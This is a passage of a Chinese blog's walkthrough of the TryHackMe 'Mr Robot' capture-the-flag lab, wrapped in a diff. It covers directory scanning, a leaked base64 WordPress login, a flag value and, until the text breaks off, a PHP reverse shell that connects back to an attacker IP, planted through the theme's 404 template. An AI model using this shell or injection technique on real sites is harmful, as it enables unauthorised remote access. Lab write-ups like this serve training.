@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Mr Robot CTF nmap检测一下但是没找到什么有用信息，直接看网址80，没找到什么，简单的交互没什么用处。 用dirsearch扫一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[21:23:55] 200 -    1KB - &#x2F;admin&#x2F;[21:23:55]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-Mr Robot CTF">
+<meta property="og:url" content="https://0ran9ewww.github.io/2025/01/21/%E6%B8%97%E9%80%8F/Mr%20Robot%20CTF/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="Mr Robot CTF nmap检测一下但是没找到什么有用信息，直接看网址80，没找到什么，简单的交互没什么用处。 用dirsearch扫一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[21:23:55] 200 -    1KB - &#x2F;admin&#x2F;[21:23:55]">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/back.png">
+<meta property="article:published_time" content="2025-01-21T15:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-21T17:10:15.856Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="wordpress">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/back.png">
+  
+  
+  
+  <title>THM-Mr Robot CTF - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/%E6%B8%97%E9%80%8F/back.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="THM-Mr Robot CTF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-21 23:00" pubdate>
+          2025年1月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">THM-Mr Robot CTF</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年1月22日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="mr-robot-ctf"><a class="markdownIt-Anchor" href="#mr-robot-ctf"></a> Mr Robot CTF</h1>
+<p>nmap检测一下但是没找到什么有用信息，直接看网址80，没找到什么，简单的交互没什么用处。</p>
+<p>用dirsearch扫一下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">55</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /admin/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">55</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">224</span>B - /admin/.htaccess<br>[<span class="hljs-number">21</span>:<span class="hljs-number">24</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /admin/index<br>[<span class="hljs-number">21</span>:<span class="hljs-number">24</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /admin/index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/admin/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">24</span>:<span class="hljs-number">02</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /admin/index.html<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">03</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /favicon.ico<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /feed  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/feed/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">34</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /html/js/misc/swfupload//swfupload.swf  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/html/js/misc/swfupload/swfupload.swf<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">39</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /image  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/image/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">40</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">216</span>B - /images/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">44</span>] <span class="hljs-number">301</span> -   <span class="hljs-number">235</span>B - /images  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/images/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">50</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:<span class="hljs-number">50</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /index.html<br>[<span class="hljs-number">21</span>:<span class="hljs-number">33</span>:<span class="hljs-number">12</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">64</span>B - /readme<br>[<span class="hljs-number">21</span>:<span class="hljs-number">33</span>:<span class="hljs-number">12</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">64</span>B - /readme.html<br>[<span class="hljs-number">21</span>:<span class="hljs-number">33</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">41</span>B - /robots.txt<br>[<span class="hljs-number">21</span>:<span class="hljs-number">33</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /roundcube/index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/roundcube/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">33</span>:<span class="hljs-number">28</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /rss  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/feed/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">34</span>:<span class="hljs-number">11</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /siteadmin/index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/siteadmin/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">34</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /sitemap<br>[<span class="hljs-number">21</span>:<span class="hljs-number">34</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /sitemap.xml<br>[<span class="hljs-number">21</span>:<span class="hljs-number">34</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /sitemap.xml.gz<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">26</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">1</span>B - /wp<span class="hljs-literal">-admin</span>/admin<span class="hljs-literal">-ajax</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">26</span>] <span class="hljs-number">302</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-admin</span>/  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-login</span>.php?redirect_to=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F10.<span class="hljs-number">10.94</span>.<span class="hljs-number">107</span>%<span class="hljs-number">2</span>Fwp<span class="hljs-literal">-admin</span>%<span class="hljs-number">2</span>F&amp;reauth=<span class="hljs-number">1</span><br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">26</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">3</span>KB - /wp<span class="hljs-literal">-admin</span>/setup<span class="hljs-literal">-config</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">26</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-config</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">31</span>] <span class="hljs-number">301</span> -   <span class="hljs-number">239</span>B - /wp<span class="hljs-literal">-content</span>  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-content</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">247</span>B - /wp<span class="hljs-literal">-content</span>/plugins/akismet/akismet.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">32</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-content</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">32</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-content</span>/plugins/adminer/inc/editor/index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-content</span>/plugins/adminer/inc/editor/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>] <span class="hljs-number">301</span> -   <span class="hljs-number">279</span>B - /wp<span class="hljs-literal">-content</span>/plugins/all<span class="hljs-operator">-in</span><span class="hljs-literal">-one-wp-migration</span>/storage  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-content</span>/plugins/all<span class="hljs-operator">-in</span><span class="hljs-literal">-one-wp-migration</span>/storage/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-content</span>/plugins/google<span class="hljs-literal">-sitemap-generator</span>/sitemap<span class="hljs-literal">-core</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>] <span class="hljs-number">500</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-content</span>/plugins/hello.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">228</span>B - /wp<span class="hljs-literal">-content</span>/uploads/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-content</span>/themes/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">200</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-cron</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">221</span>B - /wp<span class="hljs-literal">-includes</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">301</span> -   <span class="hljs-number">240</span>B - /wp<span class="hljs-literal">-includes</span>  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-includes</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">500</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-includes</span>/rss<span class="hljs-literal">-functions</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - /wp<span class="hljs-literal">-login</span>/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">36</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - /wp<span class="hljs-literal">-login</span>.php<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">36</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-register</span>.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-login</span>.php?action=register<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">36</span>] <span class="hljs-number">302</span> -     <span class="hljs-number">0</span>B - /wp<span class="hljs-literal">-signup</span>.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/wp<span class="hljs-literal">-login</span>.php?action=register<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -   <span class="hljs-number">228</span>B - /wp<span class="hljs-literal">-content</span>/upgrade/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">41</span>] <span class="hljs-number">301</span> -     <span class="hljs-number">0</span>B - /www/phpMyAdmin/index.php  -&gt;  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.107</span>/www/phpMyAdmin/<br>[<span class="hljs-number">21</span>:<span class="hljs-number">36</span>:<span class="hljs-number">35</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - /wp<span class="hljs-literal">-login</span><br></code></pre></td></tr></table></figure>
+<p>分析一下可以知道是wordpress的cms，看一下robots.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.94.107/robots.txt<br>User-agent: *<br>fsocity.dic<br>key-1-of-3.txt<br></code></pre></td></tr></table></figure>
+<h2 id="what-is-key-1"><a class="markdownIt-Anchor" href="#what-is-key-1"></a> What is key 1?</h2>
+<p>直接读取一下</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">073403</span>c8a58a1f80d943455fb<span class="hljs-number">30724b9</span><br></code></pre></td></tr></table></figure>
+<h2 id="what-is-key-2"><a class="markdownIt-Anchor" href="#what-is-key-2"></a> What is key 2?</h2>
+<p>去licence看一下，里面有内容，看一下源码(也扫到了没贴上去)，需要看f12看，藏在很后面。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?<br>do you want a password or something?<br>ZWxsaW90OkVSMjgtMDY1Mgo=<br></code></pre></td></tr></table></figure>
+<p>用base64解密<code>elliot:ER28-0652</code></p>
+<p>可以用这个来登录<code>wp-login</code>，进里面到editor里改一下404</p>
+<p>进去wp后写个马(插入不要全删)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;10.8.11.245&#x27;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">5566</span>;<br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br>	<span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br>	<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>		<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>		<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>	&#125;<br>	<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>		<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>		<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>		<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>	&#125;<br><br>	<span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>	<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span 